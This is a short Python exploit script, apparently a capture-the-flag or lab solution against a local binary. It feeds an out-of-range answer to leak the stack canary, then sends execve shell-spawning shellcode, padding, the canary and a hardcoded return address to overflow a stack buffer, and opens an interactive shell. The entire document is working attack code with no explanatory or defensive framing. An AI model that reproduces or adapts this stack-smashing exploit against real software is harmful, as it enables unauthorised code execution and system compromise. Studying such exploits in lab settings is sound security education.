import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
# Retrive output up until the program asks for the lucky number
first_data = p.readuntil('today? [0-3] ')
p.sendline('9')
# Retrive more output from that point on until the ! character
second_data = p.readuntil('!')
some_data = second_data.split(" ")[-1]
print(some_data)
cookie = some_data[:-1]
print(cookie)
print(p.readuntil('data:'))
shellcode = "\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\x54\x5F\x6A\x3B\x58\x31\xD2\x0F\x05"
p.sendline(shellcode + 17*'A' + p64(int(cookie, 16)) + 8*'B' + p64(0x7fffffffed90))
p.interactive()
